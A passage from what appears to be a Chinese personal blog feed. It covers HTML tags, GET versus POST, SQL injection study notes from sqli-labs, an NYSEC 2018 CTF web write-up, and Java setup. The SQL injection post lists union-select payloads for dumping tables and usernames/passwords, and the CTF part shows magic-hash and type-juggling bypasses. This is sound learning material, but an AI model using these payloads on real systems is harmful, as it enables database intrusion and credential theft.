|&lt;dt&gt;(http://www.runoob.com/tags/tag-dt.html) | 定义列表中的项目 |&lt;em&gt;(http://www.runoob.com/tags/tag-em.html) | 定义强调文本 |&lt;embed&gt;(http://www.runoob.com/tags/tag-embed.html)| 定义嵌入的内容，比如插件。 |&lt;fieldset&gt;(http://www.runoob.com/tags/tag-fieldset.html) | 定义围绕表单中元素的边框 |&lt;figcaption&gt;(http://www.runoob.com/tags/tag-figcaption.html)| 定义&lt;figure&gt; 元素的标题 |&lt;figure&gt;(http://www.runoob.com/tags/tag-figure.html) | 规定独立的流内容（图像、图表、照片、代码等等）。 |&lt;font&gt;(http://www.runoob.com/tags/tag-font.html) | HTML5不支持，不赞成使用。定义文字的字体、尺寸和颜色。 |&lt;footer&gt;(http://www.runoob.com/tags/tag-footer.html) | 定义 section 或 document 的页脚。 |&lt;form&gt;(http://www.runoob.com/tags/tag-form.html) | 定义了HTML文档的表单 |&lt;frame&gt;(http://www.runoob.com/tags/tag-frame.html) | 定义框架集的窗口或框架 |&lt;frameset&gt;(http://www.runoob.com/tags/tag-frameset.html) | 定义框架集 |&lt;h1&gt; to &lt;h6&gt;(http://www.runoob.com/tags/tag-hn.html) | 定义 HTML 标题 |&lt;head&gt;(http://www.runoob.com/tags/tag-head.html) | 定义关于文档的信息 |&lt;header&gt;(http://www.runoob.com/tags/tag-header.html) | 定义了文档的头部区域 |&lt;hr&gt;(http://www.runoob.com/tags/tag-hr.html) | 定义水平线 |&lt;html&gt;(http://www.runoob.com/tags/tag-html.html) | 定义 HTML 文档 |&lt;i&gt;(http://www.runoob.com/tags/tag-i.html) | 定义斜体字 |&lt;iframe&gt;(http://www.runoob.com/tags/tag-iframe.html) | 定义内联框架 |&lt;img&gt;(http://www.runoob.com/tags/tag-img.html) | 定义图像 |&lt;input&gt;(http://www.runoob.com/tags/tag-input.html) | 定义输入控件 |&lt;ins&gt;(http://www.runoob.com/tags/tag-ins.html) | 定义被插入文本 |&lt;kbd&gt;(http://www.runoob.com/tags/tag-kbd.html) | 定义键盘文本 |&lt;keygen&gt;(http://www.runoob.com/tags/tag-keygen.html)| 规定用于表单的密钥对生成器字段。 |&lt;label&gt;(http://www.runoob.com/tags/tag-label.html) | 定义 input 元素的标注 |&lt;legend&gt;(http://www.runoob.com/tags/tag-legend.html) | 定义 fieldset 元素的标题。 |&lt;li&gt;(http://www.runoob.com/tags/tag-li.html) | 定义列表的项目 |&lt;link&gt;(http://www.runoob.com/tags/tag-link.html) | 定义文档与外部资源的关系 |&lt;map&gt;(http://www.runoob.com/tags/tag-map.html) | 定义图像映射 |&lt;mark&gt;(http://www.runoob.com/tags/tag-mark.html)| 定义带有记号的文本。请在需要突出显示文本时使用 &lt;m&gt; 标签。 |&lt;menu&gt;(http://www.runoob.com/tags/tag-menu.html) | 不赞成使用。定义菜单列表。 |&lt;meta&gt;(http://www.runoob.com/tags/tag-meta.html) | 定义关于 HTML 文档的元信息。 |&lt;meter&gt;(http://www.runoob.com/tags/tag-meter.html)| 定义度量衡。仅用于已知最大和最小值的度量。 |&lt;nav&gt;(http://www.runoob.com/tags/tag-nav.html) | 定义导航链接的部分 |&lt;noframes&gt;(http://www.runoob.com/tags/tag-noframes.html) | 定义针对不支持框架的用户的替代内容。HTML5不支持 |&lt;noscript&gt;(http://www.runoob.com/tags/tag-noscript.html) | 定义针对不支持客户端脚本的用户的替代内容。 |&lt;object&gt;(http://www.runoob.com/tags/tag-object.html) | 定义内嵌对象 |&lt;ol&gt;(http://www.runoob.com/tags/tag-ol.html) | 定义有序列表。 |&lt;optgroup&gt;(http://www.runoob.com/tags/tag-optgroup.html) | 定义选择列表中相关选项的组合。 |&lt;option&gt;(http://www.runoob.com/tags/tag-option.html) | 定义选择列表中的选项。 |&lt;output&gt;(http://www.runoob.com/tags/tag-output.html) | 定义不同类型的输出，比如脚本的输出。 |&lt;p&gt;(http://www.runoob.com/tags/tag-p.html) | 定义段落。 |&lt;param&gt;(http://www.runoob.com/tags/tag-param.html) | 定义对象的参数。 |&lt;pre&gt;(http://www.runoob.com/tags/tag-pre.html) | 定义预格式文本。 |&lt;progress&gt;(http://www.runoob.com/tags/tag-progress.html)| 定义运行中的进度（进程）。 |&lt;q&gt;(http://www.runoob.com/tags/tag-q.html) | 定义短的引用。 |&lt;rp&gt;(http://www.runoob.com/tags/tag-rp.html) | &lt;rp&gt; 标签在 ruby 注释中使用，以定义不支持 ruby 元素的浏览器所显示的内容。 |&lt;rt&gt;(http://www.runoob.com/tags/tag-rt.html)| &lt;rt&gt; 标签定义字符（中文注音或字符）的解释或发音。 |&lt;ruby&gt;(http://www.runoob.com/tags/tag-ruby.html)| &lt;ruby&gt; 标签定义 ruby 注释（中文注音或字符）。 |&lt;s&gt;(http://www.runoob.com/tags/tag-s.html) | 不赞成使用。定义加删除线的文本。 |&lt;samp&gt;(http://www.runoob.com/tags/tag-samp.html) | 定义计算机代码样本。 |&lt;script&gt;(http://www.runoob.com/tags/tag-script.html) | 定义客户端脚本。 |&lt;section&gt;(http://www.runoob.com/tags/tag-section.html)| &lt;section&gt; 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。 |&lt;select&gt;(http://www.runoob.com/tags/tag-select.html) | 定义选择列表（下拉列表）。 |&lt;small&gt;(http://www.runoob.com/tags/tag-small.html) | 定义小号文本。 |&lt;source&gt;(http://www.runoob.com/tags/tag-source.html) | &lt;source&gt; 标签为媒介元素（比如 &lt;video&gt; 和 &lt;audio&gt;）定义媒介资源。 |&lt;span&gt;(http://www.runoob.com/tags/tag-span.html) | 定义文档中的节。 |&lt;strike&gt;(http://www.runoob.com/tags/tag-strike.html) | HTML5不支持，不赞成使用。定义加删除线文本。 |&lt;strong&gt;(http://www.runoob.com/tags/tag-strong.html) | 定义强调文本。 |&lt;style&gt;(http://www.runoob.com/tags/tag-style.html) | 定义文档的样式信息。 |&lt;sub&gt;(http://www.runoob.com/tags/tag-sub.html) | 定义下标文本。 |&lt;summary&gt;(http://www.runoob.com/tags/tag-summary.html)| &lt;summary&gt; 标签包含 details 元素的标题，&quot;details&quot; 元素用于描述有关文档或文档片段的详细信息。 |&lt;sup&gt;(http://www.runoob.com/tags/tag-sup.html) | 定义上标文本。 |&lt;table&gt;(http://www.runoob.com/tags/tag-table.html) | 定义表格。 |&lt;tbody&gt;(http://www.runoob.com/tags/tag-tbody.html) | 定义表格中的主体内容。 |&lt;td&gt;(http://www.runoob.com/tags/tag-td.html) | 定义表格中的单元。 |&lt;textarea&gt;(http://www.runoob.com/tags/tag-textarea.html) | 定义多行的文本输入控件。 |&lt;tfoot&gt;(http://www.runoob.com/tags/tag-tfoot.html) | 定义表格中的表注内容（脚注）。 |&lt;th&gt;(http://www.runoob.com/tags/tag-th.html) | 定义表格中的表头单元格。 |&lt;thead&gt;(http://www.runoob.com/tags/tag-thead.html) | 定义表格中的表头内容。 |&lt;time&gt;(http://www.runoob.com/tags/tag-time.html) | 定义日期或时间，或者两者。 |&lt;title&gt;(http://www.runoob.com/tags/tag-title.html) | 定义文档的标题。 |&lt;tr&gt;(http://www.runoob.com/tags/tag-tr.html) | 定义表格中的行。 |&lt;track&gt;(http://www.runoob.com/tags/tag-track.html)| &lt;track&gt; 标签为诸如 video 元素之类的媒介规定外部文本轨道。 |&lt;tt&gt;(http://www.runoob.com/tags/tag-tt.html) | 定义打字机文本。 |&lt;u&gt;(http://www.runoob.com/tags/tag-u.html) | 不赞成使用。定义下划线文本。 |&lt;ul&gt;(http://www.runoob.com/tags/tag-ul.html) | 定义无序列表。 |&lt;var&gt;(http://www.runoob.com/tags/tag-var.html) | 定义文本的变量部分。 |&lt;video&gt;(http://www.runoob.com/tags/tag-video.html) | &lt;video&gt; 标签定义视频，比如电影片段或其他视频流。 |&lt;wbr&gt;(http://www.runoob.com/tags/tag-wbr.html)|规定在文本中的何处适合添加换行符。 |</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discussion on GET and POST</title>
      <link href="/2019/01/17/Discussion-on-GET-and-POST/"/>
      <url>/2019/01/17/Discussion-on-GET-and-POST/</url>
      
        <content type="html"><![CDATA[<p>前些天学习了对Get,Post,URL,burp,hackbar,web前端查看元素的相关知识，它加强了我对Get,Post的理解，对burp,hackbar有了新的认识，对web前端查看元素(shift+ctrl+c)有了不同的感触。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>服务器+端口+路径，说白了，就是网址。。。</p><h1 id="Get与Post的区别"><a href="#Get与Post的区别" class="headerlink" title="Get与Post的区别"></a>Get与Post的区别</h1><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a52fad0e4018d7fe.png" alt="图片.png"><br>GET一般用于获取&#x2F;查询 资源信息，而POST一般用于更新 资源信息（比如提交表单的内容）<br><strong>GET提交</strong>，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；<br>例 如：login.action?name&#x3D;hyddd&amp;password&#x3D;idontknow&amp;verify&#x3D;%E4%BD%A0 %E5%A5%BD。如果数据是英文字母&#x2F;数字，原样发送，如果是空格，转换为+，如果是中文&#x2F;其他字符，则直接把字符串用url加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p><p><strong>GET请求方式</strong>将请求信息放在URL后面，请求信息和URL之间以？隔开，请求信息的格式为键值对，例如 <a href="https://baike.baidu.com/item/Python/407313?fr=aladdin%EF%BC%8C%E8%BF%99%E7%A7%8D%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E5%B0%86%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF%E7%9B%B4%E6%8E%A5%E6%9A%B4%E9%9C%B2%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E5%AE%89%E5%85%A8%E6%80%A7%E8%BE%83%E4%BD%8E%E3%80%82%E5%8F%A6%E5%A4%96%E4%BB%8E%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84%E4%B8%8A%E6%9D%A5%E7%9C%8B%EF%BC%8C%E7%94%B1%E4%BA%8E%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF%E6%94%BE%E7%BD%AE%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E4%B8%AD%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8A%A5%E6%96%87%E4%BD%93%E3%80%82">https://baike.baidu.com/item/Python/407313?fr=aladdin，这种请求方式将请求信息直接暴露在URL中，安全性较低。另外从报文结构上来看，由于请求信息放置在URL中，因此请求报文中不需要报文体。</a></p><p><strong>POST请求方式</strong>将请求信息放置在报文体中，相获得请求信息必须解析报文，因此安全性较GET方式要高一些（事实上要获得报文体中的请求信息也是很容易的，因此安全性上两者并没有太多的区别，具体解决传输过程中的安全性问题还要靠HTTPS），此外在请求报文中含有报文体。</p><p>　　由于GET中的请求信息放置在URL中，因此是有长度限制的，因为URL本身是有长度限制的。POST中的请求信息是放置在报文体中，因此对数据长度是没有限制的。</p><p>总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为”GET”，实质上，GET和POST只是发送机制不同，并不是一个取一个发！</p><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>乍一听比较高端，其实它就是个插件而已，火狐浏览器在插件中搜索它就会看到。虽然它是个插件，但是它为我们提供了不小的便利。<br>安装好后，F12查看<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5de602b883fdb4f2.png" alt="图片.png"><br>这就是我们的奇妙的Hackbar,<img src="https://upload-images.jianshu.io/upload_images/14443259-57b1ebff2988c5bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">第一个按钮会给我们将URL展示出来，我们可以肆意在URL加GET请求（以？分割）<br>第二个按钮，剪刀的样子，很明显，它起到分割换行的作用，<br>第三个则是运行相当于我们输入完网址按回车键一样。<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a5556d3fd80bc221.png" alt="图片.png"></p><p>这些分别是POST,访客来路途径，使用者代理，终端数据</p><h2 id="通过留言板对POST-GET认识"><a href="#通过留言板对POST-GET认识" class="headerlink" title="通过留言板对POST,GET认识"></a>通过留言板对POST,GET认识</h2><p>在写完留言板之后，回顾代码，我发现用到POST的地方别多，代表是传值，而通过传值可以把用户的数据传到数据库中，十分方便，这改变了我对POST抽象的认知，而GET ，通过发送请求可以把想要的数据显示出来，即完成了从数据库索取数据。</p><h2 id="学习方法总结"><a href="#学习方法总结" class="headerlink" title="学习方法总结"></a>学习方法总结</h2><p>在留言板之前，所写的内容全部都是理论,而在写完留言板之后，进行了对理论认知的更新，这便是理论与实践相结合，大大改变了我们对理论抽象的认识。对于学习新的知识我们可以先进行理论的大概学习，再通过进行项目实践，来感知这些新的事物，你会发现那些你曾经在学习中受到困扰的问题，都会在实践中迎刃而解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brief Discussion on SQL Injection</title>
      <link href="/2019/01/14/Brief-Discussion-on-SQL-Injection/"/>
      <url>/2019/01/14/Brief-Discussion-on-SQL-Injection/</url>
      
        <content type="html"><![CDATA[<p><strong>sqli-labs是我对sql学习程度的检验，玩了几道题，我查询了相关知识点,总结了一些重要的语法以及知识点，还有类似的题型解法步骤，下面我将一一汇总</strong></p><h2 id="SQL注入漏洞产生的原因"><a href="#SQL注入漏洞产生的原因" class="headerlink" title="SQL注入漏洞产生的原因"></a>SQL注入漏洞产生的原因</h2><p>SQL Injection<br>    程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患<br>    用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作</p><h2 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h2><p>Structured Query Language<br>    结构化的查询语言，是关系型数据库通讯的标准语言。<br>        查询：<code>SELECT statement FROM table WHERE condition</code><br>        删除记录：<code>DELETE FROM table WHERE condition</code><br>        更新记录：<code>UPDATE table SET field=value WHERE condtion</code><br>        添加记录：<code>INSERT INTO table field VALUES(values)</code></p><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><p>1首先测试正常数据，如<code>?id=1</code><br>2)判断是否存在注入点，如在<code>?id=1+【‘】、【and 1=1】或【and 1=2】</code><br>3)判断字段长度,列数如在<code>?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1&#39; order by 1=2 #</code><br>4判断字段回显位置，如在<code>?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</code><br>5） 判断数据库信息：<br>利用内置函数暴数据库信息<br><strong>version()版本；database()数据库；user()用户；</strong><br>不用猜解可用字段暴数据库信息(有些网站不适用):<br><code>and 1=2 union all select version()</code><br><code>and 1=2 union all select database()</code><br><code>and 1=2 union all select user()</code><br>操作系统信息：<code>and 1=2 union all select @@global.version_compile_os from mysql.user</code><br>数据库权限：</p><figure class="highlight plaintext"><figcaption><span>ord(mid(user(),1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">6） 查找数据库名</span><br><span class="line">Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息```union select information_schema from information_schema.schemata``` （语句在显示位）</span><br><span class="line">7)查找数据库表名</span><br><span class="line">```union select group_concat(table_name) from information_schema.tables where table_schema=database()```</span><br><span class="line">8)查找列名</span><br><span class="line">```union select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+```</span><br><span class="line">9)获取值</span><br><span class="line">```union select group_concat(username,password) from users--+```</span><br><span class="line">或者```1&#x27; union select 1,(select 列名 from 表名),3,4#```</span><br><span class="line">0)查找数据库表中所有字段以及字段值</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—</span><br><span class="line">and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</span><br></pre></td></tr></table></figure><p><strong>提权</strong><br>01)猜解账号密码；<br>02） 登陆管理员后台。<br>读文件： union select 绝对路径 load_file<br>写入文件：union select</p><h2 id="判断SQL注入点"><a href="#判断SQL注入点" class="headerlink" title="判断SQL注入点"></a>判断SQL注入点</h2><p>找注入点是最关键,也最基础的一个环节<br>本质原理是:<br>    找一个需要后台处理后<br>    提交给数据库的点<br>    所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般为三大类</p><pre><code>Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入</code></pre><p>例如:<br>    在常规的链接的参数中(链接?参数) 找形如?id&#x3D;num的【,】搜索框的【,】<br>而验证是否存在注入点的方法有很多种<br>最常规,也最简单的方法，引入单引号判断是否存在注入点</p><pre><code>http://host/test.php?id=100’ 返回错误说明有可能注入http://host/test.php?id=100 and 1=1 返回正常http://host/test.php?id=100 and 1=2返回错误</code></pre><p>如果满足上面三点，是注入点的可能性就很高了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NYSEC 2018 Web</title>
      <link href="/2018/12/10/NYSEC-2018-Web/"/>
      <url>/2018/12/10/NYSEC-2018-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-签到题——10’"><a href="#1-签到题——10’" class="headerlink" title="1.签到题——10’"></a>1.签到题——10’</h2><h2 id="method：复制粘贴"><a href="#method：复制粘贴" class="headerlink" title="method：复制粘贴"></a>method：复制粘贴</h2><h2 id="2-签到题2——30’"><a href="#2-签到题2——30’" class="headerlink" title="2.签到题2——30’"></a>2.签到题2——30’</h2><h2 id="method"><a href="#method" class="headerlink" title="method"></a>method</h2><p>查看元素，找到输入的元素所在位置，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-980fd2b735c28996.png" alt="img">进行修改即可，最大长度可修改为&gt;10的任意数字，最后输入即可</p><h2 id="3-flag在这里——50’"><a href="#3-flag在这里——50’" class="headerlink" title="3.flag在这里——50’"></a>3.flag在这里——50’</h2><h2 id="method-1"><a href="#method-1" class="headerlink" title="method"></a>method</h2><p>F12 进入网络 双击 也就是进入响应器<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-cd849d02cf99adbb.png" alt="img">即可发现flag</p><h2 id="4-cookie——50’"><a href="#4-cookie——50’" class="headerlink" title="4.cookie——50’"></a>4.cookie——50’</h2><p> ##method:<br>打开burp进行抓包，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d26b6c91f50f5849.png" alt="img"><br>“0”代表假，改为1为真即可<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-08c8a781167f28e2.png" alt="img"></p><h2 id="5-简单的变量覆盖"><a href="#5-简单的变量覆盖" class="headerlink" title="5.简单的变量覆盖"></a>5.简单的变量覆盖</h2><h2 id="method-2"><a href="#method-2" class="headerlink" title="method"></a>method</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d39bb0efd3f8ad90.png" alt="img"><br>根据题意，我们不难发现只需让NYSEC与filename的值相等即可，但是存在一个函数file_get_contents($filename)——把文件读入一个字符串，故需要让其两者都为空即可，打开Hackbar发送GET请求，输入?NYSEC&#x3D;&amp;filename&#x3D; 即可<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-6d9e7e9b5d282693.png" alt="img"></p><h2 id="6-web50——100’"><a href="#6-web50——100’" class="headerlink" title="6.web50——100’"></a>6.web50——100’</h2><h2 id="method-3"><a href="#method-3" class="headerlink" title="method"></a>method</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c98381671f3bd319.png" alt="img"><br>乍一看与上一道题很类似，的确很像，只是多了一个md5加密，而那句的意思便是使NYSEC,password加密后都是以0E开头的MD5值，只需发送GET请求?NYSEC&#x3D;s878926199a&amp;password&#x3D;s155964671a 即可 <img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-add4ac3222427536.png" alt="img"><br>下面附上</p><h2 id="加密后以0E开头的MD5值"><a href="#加密后以0E开头的MD5值" class="headerlink" title="加密后以0E开头的MD5值"></a>加密后以0E开头的MD5值</h2><p>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p><h2 id="7-ereg截断——200’"><a href="#7-ereg截断——200’" class="headerlink" title="7.ereg截断——200’"></a>7.ereg截断——200’</h2><h2 id="method-4"><a href="#method-4" class="headerlink" title="method"></a>method</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3de98d0b5b1759af.png" alt="img"></p><p>由代码可知，正则进行匹配出现不属于[a-z,A-Z,0-9]范围内的元素就会输出报错文字，但是下面的语句又是通过strpos来查询指定字符串出现的位置，但是匹配的又是 *-*，如果是其他的情况的话就会输出Invalid password。</p><h2 id="这里我直接通过传入一个数组直接绕过"><a href="#这里我直接通过传入一个数组直接绕过" class="headerlink" title="这里我直接通过传入一个数组直接绕过"></a>这里我直接通过传入一个数组直接绕过</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-98e5a4780e38fe18.png" alt="img"><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7bf9f038f8a7e4dc.png" alt="img"></p><h2 id="8-买彩票吗——200’"><a href="#8-买彩票吗——200’" class="headerlink" title="8.买彩票吗——200’"></a>8.买彩票吗——200’</h2><h2 id="method-5"><a href="#method-5" class="headerlink" title="method"></a>method</h2><p>这是个很经典的题，既然给出了源代码，那么通过解压之后拖放到Sublime后找到核心代码，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d5435004910899ea.png" alt="img"><br>这里是个弱类型相比，也就是输入的任何数为true就会赢，通过抓包，我们得到<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-6058d36f6ebc239d.png" alt="img"><br>1234567，只需改为[true,true,true,true,true,true,true]<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-686f8ad79522ee5e.png" alt="img">放回之后，不难发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-26f1b2a691cb877a.png" alt="img">我们赢得了5000000，以此类推，直到攒够题目要求的金钱为止。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA Environment Variable Configuration</title>
      <link href="/2018/12/08/JAVA-Environment-Variable-Configuration/"/>
      <url>/2018/12/08/JAVA-Environment-Variable-Configuration/</url>
      
        <content type="html"><![CDATA[<p><strong>本篇主要从3个方面入手，具体从下载——安装——配置——测试，解决经常出现的问题。</strong></p><hr><h2 id="提纲："><a href="#提纲：" class="headerlink" title="提纲："></a><strong>提纲：</strong></h2><p><em><strong>1.JAVA环境安装包</strong></em></p><p><em><strong>2.JAVA环境安装</strong></em></p><p><em><strong>3.JAVA环境配置</strong></em></p><p><em><strong>4.JAVA环境测试</strong></em></p><hr><h2 id="（一）JAVA环境安装包"><a href="#（一）JAVA环境安装包" class="headerlink" title="（一）JAVA环境安装包"></a><strong>（一）JAVA环境安装包</strong></h2><p>链接：<a href="https://pan.baidu.com/s/1dXknN5u3H4Fxol6u_BMNcw">https://pan.baidu.com/s/1dXknN5u3H4Fxol6u_BMNcw</a></p><p>提取码：ytz9</p><h2 id="（二）JAVA环境安装"><a href="#（二）JAVA环境安装" class="headerlink" title="（二）JAVA环境安装"></a><strong>（二）JAVA环境安装</strong></h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ead00713757397a7.jpg" alt="img"></p><p><strong>注意</strong></p><p>必须时系统C盘，否则在接下来配置的时候找不到文件等等各种问题，导致配置失败。</p><h2 id="（三）JAVA环境配置"><a href="#（三）JAVA环境配置" class="headerlink" title="（三）JAVA环境配置"></a><strong>（三）JAVA环境配置</strong></h2><p>a. 打开环境变量配置</p><p>1）打开控制面板——系统和安全</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-62751bf8dadd0ce6.png" alt="img"></p><p>2）点击查看RAM的大小和处理器速度</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ff3bdbdbcaac3f9f.png" alt="img"></p><p>3）点击左侧高级系统设置</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8172a2be3c3bd63f.png" alt="img"></p><p>4)点击环境变量</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-16d1c7f4ed70821d.png" alt="img"></p><p>b. 配置环境变量</p><p>1). JAVA_HOME 系统默认是没有的 需要新建</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bc982da8adb9fb4b.png" alt="img"></p><p>2)变量名写JAVA_HOME</p><p>变量值写jdk的安装目录, 也就是之前的解压jdk的目录 你可以先找到这个路径 然后复制过来(比如下图中的红色部分)——C:\Program Files\Java\jre1.8.0_191</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d9aa798fb6edd159.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e450d96cacc1549c.png" alt="img"></p><p>3)新建系统变量CLASSPATH</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8cf636fc9802e36d.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-cb12cd4918c0c94a.png" alt="img"></p><p><em><strong>注意需要将选中的所有字输入</strong></em></p><p><em><strong>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</strong></em></p><p><em><strong>（上述从.开始到;结束都是需要输入的）</strong></em></p><p>4）在系统变量中找到Path,双击出现如下</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ea543dfde1ba3a2c.png" alt="img"></p><p>双击后</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c93ae72a3a00ad39.png" alt="img"></p><p>5）双击后点击新建（新建两次）</p><p>第一次输入 <strong>%JAVA_HOME%\bin</strong></p><p>第二次输入 <strong>%JAVA_HOME%\jre\bin</strong></p><p>点击确定</p><h2 id="（四）JAVA环境测试"><a href="#（四）JAVA环境测试" class="headerlink" title="（四）JAVA环境测试"></a><strong>（四）JAVA环境测试</strong></h2><p>1）打开cmd<br>win键（键盘上的四个小方块组成的一个大方块）+r 输入cmd</p><p>2）输入java</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ff1e406459007bdc.png" alt="img"></p><p>如果出现类似上述的情况，那么！！！！</p><p>恭喜你！配置成功！！</p><h2 id="但是"><a href="#但是" class="headerlink" title="但是"></a><strong>但是</strong></h2><h3 id="如果出现"><a href="#如果出现" class="headerlink" title="如果出现"></a>如果出现</h3><p><img 